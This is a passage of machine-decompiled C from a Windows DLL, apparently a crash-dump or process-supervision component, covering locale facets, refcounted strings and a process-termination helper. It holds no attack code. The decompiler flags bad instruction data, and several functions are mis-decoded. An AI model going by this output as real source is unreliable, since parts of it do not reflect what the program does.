          piVar4 = (int *)FUN_1000bfa0(&DAT_1008401c,0xffffffff);
          uVar3 = 1;
          local_14 = piVar4;
        }
        if ((DAT_1009b23c & 1) == 0) {
          DAT_1009b23c = DAT_1009b23c | 1;
          local_8._0_1_ = 1;
          DAT_1009b240 = 0;
          DAT_1009b240 = FUN_100063b0();
          local_8 = (uint)local_8._1_3_ << 8;
        }
        if (DAT_1009b240 != '\0') {
          FUN_1000b610();
          uVar3 = 0;
          piVar4 = local_14;
        }
      }
      else {
        local_14 = (int *)FUN_1000bdd0(L"Global\\",0x501);
        uVar3 = 1;
        piVar4 = local_14;
      }
      piVar2 = local_1c;
      iVar1 = *local_1c;
      if ((iVar1 != 0) && (*(int *)(iVar1 + 8) != 0)) {
        piVar4 = (int *)FUN_1000bfa0(iVar1 + 0xc,*(undefined4 *)(iVar1 + 8));
        local_14 = piVar4;
      }
      iVar1 = FUN_10010440(piVar4);
      *piVar2 = iVar1;
      piVar2 = (int *)FUN_1000ae10(&local_1c);
      if (*piVar2 == 0) {
        iVar1 = 0;
      }
      else {
        iVar1 = *piVar2 + 0xc;
      }
      FUN_10006250("prefixed name: %s\n",iVar1);
      if (local_1c != (int *)0x0) {
        LOCK();
        iVar1 = *local_1c;
        *local_1c = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(local_1c);
        }
      }
      if (piVar4 != (int *)0x0) {
        LOCK();
        iVar1 = *piVar4;
        *piVar4 = *piVar4 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(piVar4);
        }
      }
      ExceptionList = local_10;
      return uVar3;
    }
  }
  ExceptionList = local_10;
  return 0;
}



/* Function: FUN_10023910 */

void __fastcall FUN_10023910(int *param_1)

{
  if (*param_1 != 0) {
    (*DAT_10079270)(*param_1);
  }
  return;
}



/* Function: FUN_10023920 */

void __fastcall FUN_10023920(int *param_1)

{
  bool bVar1;
  code *pcVar2;
  char cVar3;
  int iVar4;
  undefined4 uVar5;
  char *extraout_ECX;
  uint extraout_ECX_00;
  undefined4 extraout_EDX;
  code *unaff_EBX;
  byte bVar7;
  int *piVar8;
  undefined1 local_30 [4];
  int local_2c;
  undefined1 local_28 [4];
  undefined1 *local_24;
  undefined1 local_1c [20];
  uint local_8;
  char *pcVar6;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  if (*param_1 == 0) {
    param_1[2] = 1;
  }
  else {
    piVar8 = &local_2c;
    local_2c = 0x103;
    iVar4 = FUN_104dab61();
    if (iVar4 == 0) {
      FUN_10134621(&stack0xfffffffc);
      FUN_100579df(piVar8);
      return;
    }
    FUN_1002e2e0(1,4,0);
    FUN_10058b59(local_28,0,FUN_10023a70,param_1,0,local_30);
    iVar4 = FUN_1020da71(extraout_EDX);
    param_1[1] = iVar4;
    local_2c = (*unaff_EBX)();
    FUN_103e49e0(param_1[1],1);
    pcVar2 = (code *)swi(0x3d);
    uVar5 = (*pcVar2)();
    cVar3 = (char)uVar5 + *extraout_ECX;
    pcVar6 = (char *)CONCAT31((int3)((uint)uVar5 >> 8),cVar3);
    *pcVar6 = *pcVar6 + cVar3;
    pcVar2 = DAT_10079310;
    if (*pcVar6 != '\0') {
      do {
        iVar4 = (*unaff_EBX)();
        bVar7 = iVar4 - local_2c == 3000;
        if ((uint)(iVar4 - local_2c) < 0xbb9) break;
        (*pcVar2)(1);
        FUN_104c3fdb(param_1[1],1);
        DAT_00000102 = DAT_00000102 >> ((byte)extraout_ECX_00 & 0x1f);
        bVar1 = (extraout_ECX_00 & 0x1f) != 0;
      } while (!(bool)(!bVar1 & bVar7 | (bVar1 && DAT_00000102 == '\0')));
    }
    if ((local_1c != local_24) && (local_24 != (undefined1 *)0x0)) {
      (*DAT_10079288)(local_24);
      FUN_100579df();
      return;
    }
  }
  FUN_100579df();
  return;
}



/* Function: FUN_10023a30 */

void __fastcall FUN_10023a30(int *param_1)

{
  param_1[2] = 1;
  if (param_1[1] != 0) {
    FUN_103e4ce2(param_1[3] * 3,param_1[1],param_1[3] * 3);
    (*DAT_10079270)(param_1[1]);
  }
  if (*param_1 != 0) {
    (*DAT_10079270)(*param_1);
  }
  return;
}



/* Function: FUN_10023a70 */

undefined4 FUN_10023a70(undefined4 *param_1)

{
  code *pcVar1;
  code *pcVar2;
  int iVar3;
  int local_8;
  
  pcVar2 = DAT_10079310;
  pcVar1 = DAT_100792f8;
  local_8 = 0x103;
  if ((param_1 != (undefined4 *)0x0) && (param_1[2] == 0)) {
    while ((iVar3 = FUN_10534cf0(&stack0xfffffffc,*param_1,&local_8), iVar3 != 0 &&
           (local_8 == 0x103))) {
      (*pcVar2)(param_1[3]);
      iVar3 = (*pcVar1)(param_1,0x14);
      if ((iVar3 != 0) || (param_1[2] != 0)) break;
    }
  }
  FUN_10058c33(0);
  return 0;
}



/* Function: FUN_10023ae0 */

/* WARNING: Instruction at (ram,0x10023b35) overlaps instruction at (ram,0x10023b2d)
    */

undefined4 __fastcall FUN_10023ae0(int param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 uVar1;
  int iVar2;
  code *unaff_EBX;
  
  uVar1 = FUN_10006250("CTerminateProcess: %x, %d\n",param_1,param_2);
  if (param_1 == 0) {
    param_1 = FUN_100b28b4(uVar1,0x100001,0,param_2);
    if (param_1 == 0) {
      return 0;
    }
  }
  FUN_10432196();
  iVar2 = (*unaff_EBX)(param_1,param_3);
  if (iVar2 == 0) {
    FUN_106636a6();
  }
  else {
    (*DAT_10079270)(param_1);
  }
  return 1;
}



/* Function: FUN_10023b50 */

undefined4 * __fastcall FUN_10023b50(undefined4 *param_1)

{
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  *(undefined8 *)(param_1 + 3) = 0;
  param_1[5] = 0;
  *(undefined8 *)(param_1 + 6) = 0;
  FUN_1005ff60(param_1 + 8,0,0x50);
  param_1[0x1c] = 0;
  FUN_1005ff60(param_1 + 0x1d,0,0x2cc);
  param_1[0xd0] = 0;
  param_1[0xd1] = 0;
  FUN_1005ff60(param_1 + 0xd2,0,0x34);
  FUN_1005ff60(param_1 + 0xdf,0,0x34);
  FUN_1005ff60(param_1 + 0xec,0,0x34);
  param_1[0x106] = 0;
  param_1[0x107] = 0;
  param_1[0x108] = 0xffffffff;
  param_1[0x109] = 1;
  param_1[0x10a] = 0x55aa;
  param_1[0x10b] = 0;
  param_1[0x11d] = 0x55aa;
  FUN_1005ff60(param_1 + 0xd2,0,0x34);
  FUN_1005ff60(param_1 + 0xdf,0,0x34);
  FUN_1005ff60(param_1 + 0xec,0,0x34);
  FUN_1005ff60(param_1 + 0xf9,0,0x34);
  FUN_1005ff60(param_1 + 0x10c,0,0x42);
  FUN_1005ff60(param_1 + 8,0,0x50);
  FUN_1005ff60(param_1 + 0x1d,0,0x2cc);
  param_1[6] = param_1 + 8;
  param_1[7] = param_1 + 0x1d;
  param_1[4] = param_1 + 6;
  param_1[3] = 0;
  param_1[5] = 0;
  return param_1;
}



/* Function: FUN_10023cc0 */

undefined4 * __thiscall FUN_10023cc0(undefined4 *param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 *puVar4;
  undefined1 local_30 [44];
  
  param_1[1] = param_3;
  *param_1 = std::codecvt<wchar_t,char,int>::vftable;
  puVar4 = (undefined4 *)FUN_1005737b(local_30);
  uVar1 = puVar4[1];
  uVar2 = puVar4[2];
  uVar3 = puVar4[3];
  param_1[2] = *puVar4;
  param_1[3] = uVar1;
  param_1[4] = uVar2;
  param_1[5] = uVar3;
  uVar1 = puVar4[5];
  uVar2 = puVar4[6];
  uVar3 = puVar4[7];
  param_1[6] = puVar4[4];
  param_1[7] = uVar1;
  param_1[8] = uVar2;
  param_1[9] = uVar3;
  *(undefined8 *)(param_1 + 10) = *(undefined8 *)(puVar4 + 8);
  param_1[0xc] = puVar4[10];
  return param_1;
}



/* Function: FUN_10023d10 */

undefined4 FUN_10023d10(int *param_1,int *param_2)

{
  int iVar1;
  undefined1 *puVar2;
  undefined4 uVar3;
  bool bVar4;
  _Locinfo local_48 [52];
  undefined4 local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074b7b;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  bVar4 = false;
  local_14 = 0;
  if ((param_1 != (int *)0x0) && (*param_1 == 0)) {
    iVar1 = FUN_100582fa(0x34,DAT_100956e0 ^ (uint)&stack0xfffffffc);
    local_8 = 0;
    if (iVar1 == 0) {
      iVar1 = 0;
    }
    else {
      iVar1 = *param_2;
      if (iVar1 == 0) {
        puVar2 = &DAT_10083790;
      }
      else {
        puVar2 = *(undefined1 **)(iVar1 + 0x18);
        if (puVar2 == (undefined1 *)0x0) {
          puVar2 = (undefined1 *)(iVar1 + 0x1c);
        }
      }
      uVar3 = FUN_100082d0(puVar2);
      bVar4 = true;
      iVar1 = FUN_10023cc0(uVar3,0);
    }
    *param_1 = iVar1;
    if (bVar4) {
      std::_Locinfo::~_Locinfo(local_48);
    }
  }
  ExceptionList = local_10;
  return 2;
}



/* Function: FUN_10023dc0 */

bool __thiscall
FUN_10023dc0(int param_1,undefined4 param_2,int param_3,int param_4,int *param_5,int param_6,
            int param_7,int *param_8)

{
  char *pcVar1;
  char cVar2;
  char *pcVar3;
  bool bVar4;
  
  *param_5 = param_3;
  *param_8 = param_6;
  bVar4 = *param_5 != param_4;
  if (*param_5 != param_4) {
    while (*param_8 != param_7) {
      pcVar3 = (char *)FUN_10057442(*param_8,*param_5,param_4 - *param_5,param_2,param_1 + 8);
      if (pcVar3 == (char *)0xfffffffe) {
        *param_5 = param_4;
        return bVar4;
      }
      if (pcVar3 == (char *)0xffffffff) {
        return (bool)2;
      }
      if (pcVar3 == (char *)0x0) {
        if (*(short *)*param_8 == 0) {
          pcVar3 = (char *)*param_5;
          pcVar1 = pcVar3 + 1;
          do {
            cVar2 = *pcVar3;
            pcVar3 = pcVar3 + 1;
          } while (cVar2 != '\0');
          pcVar3 = pcVar3 + (1 - (int)pcVar1);
          goto LAB_10023e3c;
        }
      }
      else {
LAB_10023e3c:
        if (pcVar3 == (char *)0xfffffffd) {
          pcVar3 = (char *)0x0;
        }
      }
      *param_5 = (int)(pcVar3 + *param_5);
      bVar4 = false;
      *param_8 = *param_8 + 2;
      if (*param_5 == param_4) {
        return false;
      }
    }
  }
  return bVar4;
}



/* Function: FUN_10023e80 */

void __thiscall
FUN_10023e80(int param_1,undefined4 *param_2,int param_3,int param_4,int *param_5,int param_6,
            int param_7,int *param_8)

{
  undefined4 uVar1;
  int iVar2;
  int iVar3;
  undefined1 local_10 [8];
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  *param_5 = param_3;
  *param_8 = param_6;
  iVar3 = *param_5;
  do {
    if ((iVar3 == param_4) || (*param_8 == param_7)) {
      FUN_100579df();
      return;
    }
    iVar3 = *param_8;
    iVar2 = FUN_1005adf9();
    if (param_7 - iVar3 < iVar2) {
      uVar1 = *param_2;
      iVar3 = FUN_100573e4(local_10,*(undefined2 *)*param_5,param_2,param_1 + 8);
      if (iVar3 < 0) goto LAB_10023f6c;
      if (param_7 - *param_8 < iVar3) {
        *param_2 = uVar1;
        FUN_100579df();
        return;
      }
      FUN_1005d740(*param_8,local_10,iVar3);
      *param_5 = *param_5 + 2;
      *param_8 = *param_8 + iVar3;
    }
    else {
      iVar3 = FUN_100573e4(iVar3,*(undefined2 *)*param_5,param_2,param_1 + 8);
      if (iVar3 < 0) {
LAB_10023f6c:
        FUN_100579df();
        return;
      }
      *param_5 = *param_5 + 2;
      *param_8 = *param_8 + iVar3;
    }
    iVar3 = *param_5;
  } while( true );
}



/* Function: FUN_10023fb0 */

void __thiscall FUN_10023fb0(int param_1,undefined4 *param_2,int param_3,int param_4,int *param_5)

{
  undefined4 uVar1;
  int iVar2;
  undefined1 local_10 [8];
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  *param_5 = param_3;
  uVar1 = *param_2;
  iVar2 = FUN_100573e4(local_10,0,param_2,param_1 + 8);
  if (iVar2 < 1) {
    FUN_100579df();
    return;
  }
  iVar2 = iVar2 + -1;
  if (param_4 - *param_5 < iVar2) {
    *param_2 = uVar1;
    FUN_100579df();
    return;
  }
  if (0 < iVar2) {
    FUN_1005d740(*param_5,local_10,iVar2);
    *param_5 = *param_5 + iVar2;
  }
  FUN_100579df();
  return;
}



/* Function: FUN_10024060 */

uint __thiscall
FUN_10024060(int param_1,undefined4 *param_2,char *param_3,char *param_4,uint param_5)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  char *pcVar4;
  uint uVar5;
  undefined4 local_8;
  
  pcVar2 = param_4;
  local_8 = *param_2;
  uVar5 = 0;
  pcVar4 = param_3;
  if (param_5 != 0) {
    do {
      if (pcVar4 == pcVar2) {
        return uVar5;
      }
      pcVar3 = (char *)FUN_10057442(&param_2,pcVar4,(int)pcVar2 - (int)pcVar4,&local_8,param_1 + 8);
      if (pcVar3 == (char *)0xfffffffe) {
        return uVar5;
      }
      if (pcVar3 == (char *)0xffffffff) {
        return uVar5;
      }
      if (pcVar3 == (char *)0x0) {
        if ((short)param_2 == 0) {
          pcVar3 = pcVar4;
          do {
            cVar1 = *pcVar3;
            pcVar3 = pcVar3 + 1;
          } while (cVar1 != '\0');
          pcVar3 = pcVar3 + (1 - (int)(pcVar4 + 1));
          goto LAB_100240c2;
        }
      }
      else {
LAB_100240c2:
        if (pcVar3 == (char *)0xfffffffd) {
          pcVar3 = (char *)0x0;
        }
      }
      uVar5 = uVar5 + 1;
      pcVar4 = pcVar4 + (int)pcVar3;
    } while (uVar5 < param_5);
  }
  return uVar5;
}



/* Function: FUN_100240e0 */

undefined1 FUN_100240e0(void)

{
  return 0;
}



/* Function: FUN_100240f0 */

undefined4 FUN_100240f0(void)

{
  return 5;
}



/* Function: FUN_10024100 */

undefined4 * __thiscall FUN_10024100(undefined4 *param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 *puVar4;
  undefined1 local_40 [44];
  undefined1 local_14 [16];
  
  param_1[1] = param_3;
  *param_1 = std::ctype<wchar_t>::vftable;
  puVar4 = (undefined4 *)FUN_10056e89(local_14);
  uVar1 = puVar4[1];
  uVar2 = puVar4[2];
  uVar3 = puVar4[3];
  param_1[2] = *puVar4;
  param_1[3] = uVar1;
  param_1[4] = uVar2;
  param_1[5] = uVar3;
  puVar4 = (undefined4 *)FUN_1005737b(local_40);
  uVar1 = puVar4[1];
  uVar2 = puVar4[2];
  uVar3 = puVar4[3];
  param_1[6] = *puVar4;
  param_1[7] = uVar1;
  param_1[8] = uVar2;
  param_1[9] = uVar3;
  uVar1 = puVar4[5];
  uVar2 = puVar4[6];
  uVar3 = puVar4[7];
  param_1[10] = puVar4[4];
  param_1[0xb] = uVar1;
  param_1[0xc] = uVar2;
  param_1[0xd] = uVar3;
  *(undefined8 *)(param_1 + 0xe) = *(undefined8 *)(puVar4 + 8);
  param_1[0x10] = puVar4[10];
  return param_1;
}



/* Function: FUN_10024160 */

undefined4 FUN_10024160(int *param_1,int *param_2)

{
  int iVar1;
  undefined1 *puVar2;
  undefined4 uVar3;
  bool bVar4;
  _Locinfo local_48 [52];
  undefined4 local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074b7b;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  bVar4 = false;
  local_14 = 0;
  if ((param_1 != (int *)0x0) && (*param_1 == 0)) {
    iVar1 = FUN_100582fa(0x44,DAT_100956e0 ^ (uint)&stack0xfffffffc);
    local_8 = 0;
    if (iVar1 == 0) {
      iVar1 = 0;
    }
    else {
      iVar1 = *param_2;
      if (iVar1 == 0) {
        puVar2 = &DAT_10083790;
      }
      else {
        puVar2 = *(undefined1 **)(iVar1 + 0x18);
        if (puVar2 == (undefined1 *)0x0) {
          puVar2 = (undefined1 *)(iVar1 + 0x1c);
        }
      }
      uVar3 = FUN_100082d0(puVar2);
      bVar4 = true;
      iVar1 = FUN_10024100(uVar3,0);
    }
    *param_1 = iVar1;
    if (bVar4) {
      std::_Locinfo::~_Locinfo(local_48);
    }
  }
  ExceptionList = local_10;
  return 2;
}



/* Function: FUN_10024210 */

bool __thiscall FUN_10024210(int param_1,ushort param_2,undefined4 param_3)

{
  ushort uVar1;
  
  uVar1 = FUN_10057599(param_3,param_1 + 8);
  return (param_2 & uVar1) != 0;
}



/* Function: FUN_10024240 */

void __thiscall FUN_10024240(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  FUN_100575bd(param_2,param_3,param_4,param_1 + 8);
  return;
}



/* Function: FUN_10024260 */

undefined2 * __thiscall
FUN_10024260(int *param_1,undefined4 param_2,undefined2 *param_3,undefined2 *param_4)

{
  char cVar1;
  
  if (param_3 != param_4) {
    do {
      cVar1 = (**(code **)(*param_1 + 0x10))(param_2,*param_3);
      if (cVar1 != '\0') {
        return param_3;
      }
      param_3 = param_3 + 1;
    } while (param_3 != param_4);
  }
  return param_3;
}



/* Function: FUN_100242a0 */

undefined2 * __thiscall
FUN_100242a0(int *param_1,undefined4 param_2,undefined2 *param_3,undefined2 *param_4)

{
  char cVar1;
  
  if (param_3 != param_4) {
    do {
      cVar1 = (**(code **)(*param_1 + 0x10))(param_2,*param_3);
      if (cVar1 == '\0') {
        return param_3;
      }
      param_3 = param_3 + 1;
    } while (param_3 != param_4);
  }
  return param_3;
}



/* Function: FUN_100242e0 */

void __thiscall FUN_100242e0(int param_1,undefined4 param_2)

{
  FUN_100575dc(param_2,param_1 + 8);
  return;
}



/* Function: FUN_10024300 */

undefined2 * __thiscall FUN_10024300(int param_1,undefined2 *param_2,undefined2 *param_3)

{
  undefined2 uVar1;
  uint uVar2;
  uint uVar3;
  
  uVar2 = (uint)((int)param_3 + (1 - (int)param_2)) >> 1;
  uVar3 = 0;
  if (param_3 < param_2) {
    uVar2 = 0;
  }
  if (uVar2 != 0) {
    do {
      uVar1 = FUN_100575dc(*param_2,param_1 + 8);
      *param_2 = uVar1;
      uVar3 = uVar3 + 1;
      param_2 = param_2 + 1;
    } while (uVar3 != uVar2);
  }
  return param_2;
}



/* Function: FUN_10024350 */

void __thiscall FUN_10024350(int param_1,undefined4 param_2)

{
  FUN_10057648(param_2,param_1 + 8);
  return;
}



/* Function: FUN_10024370 */

undefined2 * __thiscall FUN_10024370(int param_1,undefined2 *param_2,undefined2 *param_3)

{
  undefined2 uVar1;
  uint uVar2;
  uint uVar3;
  
  uVar2 = (uint)((int)param_3 + (1 - (int)param_2)) >> 1;
  uVar3 = 0;
  if (param_3 < param_2) {
    uVar2 = 0;
  }
  if (uVar2 != 0) {
    do {
      uVar1 = FUN_10057648(*param_2,param_1 + 8);
      *param_2 = uVar1;
      uVar3 = uVar3 + 1;
      param_2 = param_2 + 1;
    } while (uVar3 != uVar2);
  }
  return param_2;
}



/* Function: FUN_100243c0 */

undefined2 __thiscall FUN_100243c0(int param_1,undefined4 param_2)

{
  int iVar1;
  undefined4 local_c;
  undefined2 local_8 [2];
  
  local_c = 0;
  iVar1 = FUN_10057442(local_8,&param_2,1,&local_c,param_1 + 0x18);
  if (iVar1 < 0) {
    local_8[0] = 0xffff;
  }
  return local_8[0];
}



/* Function: FUN_10024410 */

undefined1 * __thiscall
FUN_10024410(int param_1,undefined1 *param_2,undefined1 *param_3,undefined2 *param_4)

{
  int iVar1;
  undefined2 uVar2;
  undefined2 *puVar3;
  undefined1 *puVar4;
  int iVar5;
  int local_8;
  
  iVar5 = (int)param_3 - (int)param_2;
  local_8 = 0;
  if (param_3 < param_2) {
    iVar5 = 0;
  }
  puVar4 = param_2;
  if (iVar5 != 0) {
    puVar3 = param_4;
    do {
      param_3 = (undefined1 *)CONCAT31(param_3._1_3_,*puVar4);
      param_4 = (undefined2 *)0x0;
      iVar1 = FUN_10057442(&param_2,&param_3,1,&param_4,param_1 + 0x18);
      uVar2 = param_2._0_2_;
      if (iVar1 < 0) {
        uVar2 = 0xffff;
      }
      local_8 = local_8 + 1;
      *puVar3 = uVar2;
      puVar4 = puVar4 + 1;
      puVar3 = puVar3 + 1;
    } while (local_8 != iVar5);
  }
  return puVar4;
}



/* Function: FUN_100244a0 */

void __thiscall FUN_100244a0(int param_1,undefined4 param_2)

{
  undefined4 local_14;
  undefined1 local_10 [8];
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_14 = 0;
  FUN_100573e4(local_10,param_2,&local_14,param_1 + 0x18);
  FUN_100579df();
  return;
}



/* Function: FUN_100244f0 */

void __thiscall
FUN_100244f0(int param_1,undefined2 *param_2,undefined2 *param_3,undefined1 param_4,
            undefined1 *param_5)

{
  int iVar1;
  undefined1 uVar2;
  uint uVar3;
  undefined4 local_18;
  uint local_14;
  undefined1 local_10 [8];
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_14 = 0;
  uVar3 = (uint)((int)param_3 + (1 - (int)param_2)) >> 1;
  if (param_3 < param_2) {
    uVar3 = 0;
  }
  if (uVar3 != 0) {
    do {
      local_18 = 0;
      iVar1 = FUN_100573e4(local_10,*param_2,&local_18,param_1 + 0x18);
      uVar2 = local_10[0];
      if (iVar1 != 1) {
        uVar2 = param_4;
      }
      local_14 = local_14 + 1;
      *param_5 = uVar2;
      param_2 = param_2 + 1;
      param_5 = param_5 + 1;
    } while (local_14 != uVar3);
  }
  FUN_100579df();
  return;
}



/* Function: FUN_10024590 */

undefined4 * __thiscall FUN_10024590(undefined4 *param_1,byte param_2)

{
  *param_1 = std::ctype<wchar_t>::vftable;
  if (param_1[4] != 0) {
    FUN_100579ee(param_1[3]);
  }
  FUN_100579ee(param_1[5]);
  *param_1 = std::_Facet_base::vftable;
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_100245e0 */

bool __fastcall FUN_100245e0(undefined4 param_1,undefined4 param_2)

{
  short sVar1;
  
  sVar1 = FUN_1005ad34(param_1,param_2);
  return sVar1 != -1;
}



/* Function: FUN_10024600 */

int __fastcall FUN_10024600(undefined4 param_1,int *param_2,int *param_3,undefined4 *param_4)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  int iVar4;
  undefined4 uVar5;
  int extraout_ECX;
  undefined **ppuVar6;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10075518;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_14 = (int *)0x0;
  local_8 = 0;
  if (((*param_3 != 0) && (*(int *)(*param_3 + 8) != 0)) ||
     (iVar4 = FUN_1000c520(&local_14,uVar3), iVar4 == 0)) {
    iVar4 = FUN_1000c520(&local_14,uVar3);
  }
  piVar2 = local_14;
  if (local_14 != (int *)0x0) {
    if (local_14[2] != 0) {
      iVar4 = *param_3;
      if ((iVar4 == 0) || (*(int *)(iVar4 + 8) == 0)) {
        iVar4 = FUN_1000bdd0(L"wait for unregistered exception from ",iVar4);
        *param_3 = iVar4;
        iVar4 = piVar2[2];
        if (iVar4 != 0) {
          iVar4 = FUN_1000bfa0(piVar2 + 3,iVar4);
          *param_3 = iVar4;
          iVar4 = extraout_ECX;
        }
      }
      uVar5 = FUN_1000bdd0(L"lmi crash dump data from ",iVar4);
      *param_4 = uVar5;
      if (piVar2[2] != 0) {
        uVar5 = FUN_1000bfa0(piVar2 + 3,piVar2[2]);
        *param_4 = uVar5;
      }
      if (*param_2 == 0) {
        ppuVar6 = &PTR_10083554;
        if ((undefined **)(piVar2 + 3) != (undefined **)0x0) {
          ppuVar6 = (undefined **)(piVar2 + 3);
        }
        iVar4 = FUN_1004b770(ppuVar6);
        *param_2 = iVar4;
      }
    }
    LOCK();
    iVar1 = *piVar2;
    iVar4 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      iVar4 = FUN_100579ee(piVar2);
    }
  }
  ExceptionList = local_10;
  return iVar4;
}



/* Function: FUN_10024730 */

/* WARNING: Instruction at (ram,0x10024c4a) overlaps instruction at (ram,0x10024c49)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING (jumptable): Unable to track spacebase fully for stack */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void __thiscall FUN_10024730(undefined4 *param_1,short *param_2,undefined4 param_3,int *param_4)

{
  uint uVar1;
  undefined1 uVar2;
  int *piVar3;
  int iVar4;
  int *piVar5;
  uint uVar6;
  code *pcVar7;
  undefined4 uVar8;
  int *piVar9;
  int iVar10;
  int iVar11;
  undefined4 *puVar12;
  undefined4 extraout_ECX;
  undefined **ppuVar13;
  short *psVar14;
  short *extraout_ECX_00;
  int *extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined4 extraout_ECX_08;
  undefined4 extraout_ECX_09;
  undefined4 extraout_ECX_10;
  undefined4 extraout_ECX_11;
  undefined4 extraout_ECX_12;
  undefined4 extraout_ECX_13;
  undefined4 extraout_ECX_14;
  undefined4 extraout_ECX_15;
  undefined4 extraout_ECX_16;
  undefined4 extraout_ECX_17;
  undefined4 extraout_ECX_18;
  undefined4 extraout_ECX_19;
  undefined4 extraout_ECX_20;
  int unaff_EBX;
  undefined4 *puVar15;
  bool bVar16;
  char cVar17;
  char cVar18;
  float10 extraout_ST0;
  wchar_t *pwVar19;
  wchar_t *pwVar20;
  wchar_t *pwVar21;
  undefined *puVar22;
  undefined4 uVar23;
  undefined4 uVar24;
  undefined4 uVar25;
  undefined4 uVar26;
  undefined4 uVar27;
  int local_258 [2];
  undefined4 local_250;
  undefined4 local_24c;
  short *local_248;
  undefined4 local_230;
  undefined4 local_21c;
  int *local_214;
  undefined4 local_208 [2];
  int *local_200;
  undefined4 *local_1f8;
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10075e4f;
  local_10 = ExceptionList;
  local_18 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_214 = param_4;
  local_248 = param_2;
  local_21c = 0;
  *param_1 = 0;
  local_8 = 0;
  param_1[1] = 0;
  local_1f8 = param_1;
  if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
    piVar3 = (int *)FUN_1000bd10(local_18);
  }
  else {
    piVar3 = (int *)FUN_1000ba60();
  }
  local_200 = piVar3;
  local_8._0_1_ = 1;
  if (((piVar3 == (int *)0x0) || (piVar3[2] == 0)) ||
     (iVar4 = FUN_1004b5c0(L"/ESCORT",7), iVar4 == -1)) {
    local_1f8[1] = 5;
    puVar15 = (undefined4 *)&stack0xfffffffc;
    if (piVar3 != (int *)0x0) {
      LOCK();
      iVar4 = *piVar3;
      *piVar3 = *piVar3 + -1;
      UNLOCK();
      puVar15 = (undefined4 *)&stack0xfffffffc;
      if (iVar4 + -1 < 0) {
        FUN_100579ee(piVar3);
        puVar15 = (undefined4 *)&stack0xfffffffc;
      }
    }
    goto LAB_100263b7;
  }
  local_208[0] = 0;
  local_24c = 0;
  local_8 = CONCAT31(local_8._1_3_,3);
  if (((local_214 != (int *)0x0) && (iVar4 = *local_214, iVar4 != 0)) && (*(int *)(iVar4 + 8) != 0))
  {
    if (iVar4 == 0) {
      iVar4 = 0;
    }
    else {
      iVar4 = iVar4 + 0xc;
    }
    local_208[0] = FUN_1000bdd0(iVar4,extraout_ECX);
  }
  uVar24 = 0x1002487b;
  FUN_10024600(local_208,&local_24c);
  if ((local_214 != (int *)0x0) && ((*local_214 == 0 || (*(int *)(*local_214 + 8) == 0)))) {
    iVar4 = FUN_10010440(local_208[0]);
    *local_214 = iVar4;
  }
  local_258[0] = 0;
  local_250 = 0;
  local_214 = (int *)0x0;
  local_230 = 0;
  if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
    piVar5 = (int *)FUN_1000bd10();
  }
  else {
    piVar5 = (int *)FUN_1000ba60();
  }
  local_8 = CONCAT31(local_8._1_3_,6);
  iVar4 = FUN_100414b0(local_258);
  if (piVar5 != (int *)0x0) {
    LOCK();
    iVar10 = *piVar5;
    *piVar5 = iVar10 + -1;
    UNLOCK();
    if (iVar10 + -1 < 0) {
      FUN_100579ee(piVar5);
    }
  }
  if (iVar4 != 0) {
    if ((local_258[0] == 0) ||
       (ppuVar13 = (undefined **)(local_258[0] + 0xc), ppuVar13 == (undefined **)0x0)) {
      ppuVar13 = &PTR_10083554;
    }
    local_214 = (int *)FUN_1004b7e0(ppuVar13);
  }
  if ((local_248 == (short *)0x0) || (*local_248 != 0)) {
    piVar5 = (int *)FUN_1000bd10();
  }
  else {
    piVar5 = (int *)FUN_1000ba60();
  }
  local_8._0_1_ = 7;
  uVar26 = 0x100249ac;
  local_248 = (short *)FUN_100414b0(&local_250);
  local_8._0_1_ = 5;
  psVar14 = local_248;
  puVar15 = (undefined4 *)&stack0xfffffffc;
  if (piVar5 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar5;
    *piVar5 = iVar4 + -1;
    UNLOCK();
    puVar15 = (undefined4 *)&stack0xfffffffc;
    if (iVar4 + -1 < 0) {
      uVar26 = 0x100249ce;
      FUN_100579ee(piVar5);
      psVar14 = local_248;
